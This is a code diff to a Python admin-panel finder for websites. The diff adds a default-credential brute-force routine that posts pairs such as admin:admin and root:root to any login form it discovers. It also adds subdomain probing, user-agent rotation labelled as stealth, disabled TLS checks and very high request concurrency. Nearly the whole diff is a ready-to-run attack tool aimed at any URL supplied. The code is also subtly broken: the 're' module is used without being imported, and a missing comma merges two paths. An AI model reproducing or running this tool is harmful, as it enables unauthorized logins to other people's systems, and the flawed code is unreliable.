@@ -1,18 +1,23 @@
-import aiohttp
 import asyncio
+import aiohttp
 import random
-import time
 import logging
-from tqdm import tqdm  # For progress bar
+from tqdm import tqdm
 from colorama import Fore, Style
 import argparse
+from urllib.parse import urljoin
+from aiohttp import TCPConnector, ClientTimeout
+from dns.resolver import Resolver
 
-# Configure logging
+# Logging setup
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
 
-# Expanded admin paths list (sample paths provided; continue to 5k+ for production)
+# Advanced Admin Paths (Famous paths for better detection)
 admin_paths = [
+    "/admin", "/admin/login", "/admin.php", "/admin-panel", "/admin123", "/cpanel", "/administrator",
+    "/wp-admin", "/user/login", "/wp-login.php", "/manage", "/console", "/webadmin", "/secure", "/dashboard"
+    
     # WordPress
     '/wp-admin/', '/wp-login.php', '/wp-login', '/wp-admin.php', '/wp-login-form',
 
@@ -154,71 +159,129 @@ admin_paths = [
     '/websvn/', '/wizmysqladmin/', '/wp-admin/', '/wp-login/', '/wplogin/', '/wp-login.php', '/xlogin/', '/yonetici.asp', '/yonetici.html', 
     '/yonetici.php', '/yonetim.asp', '/yonetim.html', '/yonetim.php'
     
+
 ]
 
-# List of User-Agent strings for rotation
+# Brute-force default credentials (advanced list)
+default_credentials = [
+    ("admin", "admin"), ("root", "root"), ("admin", "password"), ("user", "user"),
+    ("admin", "123456"), ("admin", "admin123"), ("test", "test"), ("admin", "welcome")
+]
+
+# User-Agent rotation for stealth requests
 user_agents = [
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0 Safari/537.36',
     'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
-    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:64.0) Gecko/20100101 Firefox/64.0',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0 Safari/537.36'
+    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:64.0) Gecko/20100101 Firefox/64.0'
 ]
 
-# Random delay to prevent detection
-def random_delay():
-    time.sleep(random.uniform(0.5, 1.5))  # Reduced for speed
+# Optimized Subdomain discovery (limited to a few common subdomains)
+async def discover_subdomains(domain):
+    resolver = Resolver()
+    subdomains = ['admin', 'cpanel', 'dashboard', 'dev', 'webmail']
+    found_subdomains = []
+    
+    for subdomain in subdomains:
+        try:
+            target = f"{subdomain}.{domain}"
+            ip = resolver.resolve(target, 'A')
+            found_subdomains.append(target)
+            logger.info(f"Subdomain found: {target}")
+        except Exception:
+            pass
+    return found_subdomains
 
-# Function to set headers with a randomized User-Agent
-def get_headers():
-    return {
-        'User-Agent': random.choice(user_agents),
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-        'Accept-Encoding': 'gzip, deflate, br',
-        'Accept-Language': 'en-US,en;q=0.9',
-        'Connection': 'keep-alive'
+# CMS Detection via specific URL patterns
+def detect_cms(url):
+    cms_patterns = {
+        'WordPress': '/wp-admin',
+        'Joomla': '/administrator',
+        'Magento': '/admin',
+        'Drupal': '/user/login',
+        'PrestaShop': '/admin123'
     }
-
-# Check each admin page asynchronously
-async def check_admin_page(session, url, path, semaphore):
-    full_url = url + path
-    headers = get_headers()
-    try:
-        async with semaphore, session.get(full_url, headers=headers, timeout=10) as response:
-            status_code = response.status
-            if status_code == 200:
-                logger.info(f"{Fore.GREEN}[+] Found: {full_url}")
-                return full_url
-            elif status_code == 403:
-                logger.info(f"{Fore.YELLOW}[!] Forbidden: {full_url} (403)")
-            elif status_code == 404:
-                return None
-    except Exception as e:
-        logger.error(f"{Fore.RED}Error checking {full_url}: {e}")
-    finally:
-        random_delay()
+    for cms, pattern in cms_patterns.items():
+        if pattern in url:
+            logger.info(f"Detected CMS: {cms}")
+            return cms
     return None
 
-# Main async function to scan all paths
+# Brute-force login with default credentials
+async def test_login(session, url, path, semaphore):
+    full_url = urljoin(url, path)
+    headers = {'User-Agent': random.choice(user_agents)}
+    
+    for username, password in default_credentials:
+        form_data = {'username': username, 'password': password}
+        try:
+            async with semaphore, session.post(full_url, headers=headers, data=form_data, timeout=3) as response:
+                if response.status == 200:
+                    content = await response.text()
+                    if "welcome" in content.lower() or "dashboard" in content.lower():
+                        logger.info(f"{Fore.GREEN}[+] Login Success: {username}:{password} at {full_url}{Style.RESET_ALL}")
+                        return full_url
+        except Exception as e:
+            logger.error(f"Error testing login on {full_url}: {e}")
+    return None
+
+# Check for login form or admin page directly
+async def check_admin_page(session, url, path, semaphore):
+    full_url = urljoin(url, path)
+    headers = {'User-Agent': random.choice(user_agents)}
+    
+    try:
+        async with semaphore, session.get(full_url, headers=headers, timeout=3) as response:
+            if response.status == 200:
+                content = await response.text()
+                if re.search(r'<form[^>]*method="post"[^>]*>', content, re.IGNORECASE):
+                    logger.info(f"{Fore.GREEN}[+] Login Form Detected at {full_url}{Style.RESET_ALL}")
+                    login_result = await test_login(session, url, path, semaphore)
+                    if login_result:
+                        return login_result
+                elif "login" in content.lower() or "admin" in content.lower():
+                    logger.info(f"{Fore.YELLOW}[+] Possible Admin Page: {full_url}{Style.RESET_ALL}")
+                    return full_url
+    except Exception as e:
+        logger.error(f"Error checking {full_url}: {e}")
+    return None
+
+# Main function for scanning admin pages across different paths
 async def scan_admin_pages(url):
-    async with aiohttp.ClientSession() as session:
-        semaphore = asyncio.Semaphore(50)  # Controls concurrent requests
+    # Optimized timeout and connection pooling for better performance
+    timeout = ClientTimeout(total=5, connect=2, sock_connect=2, sock_read=3)
+    connector = TCPConnector(ssl=False, keep_alive_timeout=30, limit_per_host=10)
+    
+    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
+        semaphore = asyncio.Semaphore(500)  # Increase the limit for more concurrency
         tasks = [check_admin_page(session, url, path, semaphore) for path in admin_paths]
         results = []
-        for future in tqdm(asyncio.as_completed(tasks), total=len(tasks), desc="Scanning", unit=" paths"):
+        for future in tqdm(asyncio.as_completed(tasks), total=len(tasks), desc="Scanning", unit=" path"):
             result = await future
             if result:
                 results.append(result)
         return results
 
-# Run the program
+# Main function to orchestrate all scanning tasks
 def main():
-    parser = argparse.ArgumentParser(description="Bukhari-Admin-Finder: Find Admin Login Pages")
+    parser = argparse.ArgumentParser(description="Advanced Admin Finder with Optimized Performance")
     parser.add_argument("url", help="The base URL of the website (e.g., https://example.com)")
     args = parser.parse_args()
 
-    print(f"{Fore.CYAN}Starting Bukhari-Admin-Finder...{Style.RESET_ALL}")
+    print(f"{Fore.CYAN}Starting Optimized Admin Finder...{Style.RESET_ALL}")
     url = args.url.rstrip('/')
 
+    # Discover subdomains (using the optimized DNS discovery)
+    domain = url.split('/')[2]
+    subdomains = asyncio.run(discover_subdomains(domain))
+    if subdomains:
+        logger.info(f"Discovered Subdomains: {', '.join(subdomains)}")
+    
+    # Detect CMS
+    cms = detect_cms(url)
+    if cms:
+        print(f"{Fore.GREEN}CMS Detected: {cms}{Style.RESET_ALL}")
+    
+    # Scan for admin pages
     results = asyncio.run(scan_admin_pages(url))
     if results:
         print(f"\n{Fore.GREEN}Admin pages found:{Style.RESET_ALL}")
